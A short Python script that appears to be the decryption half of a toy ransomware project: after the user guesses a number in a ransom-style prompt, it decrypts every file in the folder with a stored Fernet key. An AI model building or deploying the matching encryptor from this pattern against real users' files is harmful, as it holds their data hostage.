import os
from cryptography.fernet import Fernet


files = []
for file in os.listdir():
    if file=="malware.py" or file=="key.key" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("key.key","rb") as key_file:
    secretKey = key_file.read()
    
target = 23
print("Guess the right number to get your data back")
guess = -1
while guess != 23:
    guess = int(input())
    if guess < target:
        print("Too low")
    elif guess > target:
        print("Too high")
    else:
        print("Correct!! You are lucky enough to get your data back")
        

for file in files:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_decrypted = Fernet(secretKey).decrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contents_decrypted)
